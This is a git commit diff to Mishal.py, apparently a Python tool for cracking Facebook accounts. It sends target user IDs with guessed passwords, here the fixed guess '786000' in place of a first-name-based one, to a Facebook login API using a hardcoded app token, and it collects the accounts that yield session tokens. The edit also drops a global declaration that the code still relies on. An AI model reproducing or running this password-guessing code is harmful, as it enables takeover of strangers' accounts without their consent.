e7b0f02679860def18778b49a83d5aafe9688d90
Jam302 <65140038+Jam302@users.noreply.github.com>
2020-05-17 10:04:53 +0500

    Update Mishal.py

--- Mishal.py
+++ Mishal.py
@@ -298,7 +298,7 @@ def pilih_super():
 	print  "  \033[1;92m ◄══════════════════💥══════════════════►" 
 
 	def main(arg):
-		global cekpoint,oks
+		global oks
 		user = arg
 		try:
 			os.mkdir('out')
@@ -339,7 +339,7 @@ def pilih_super():
 				               cek.close()
 				               cekpoint.append(user+pass2)								
 				           else:											
-					       pass2 = b['first_name'] + '1122'									
+					       pass3 = '786000'									
 					       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")										
 					       q = json.load(data)										
 					       if 'access_token' in q:	
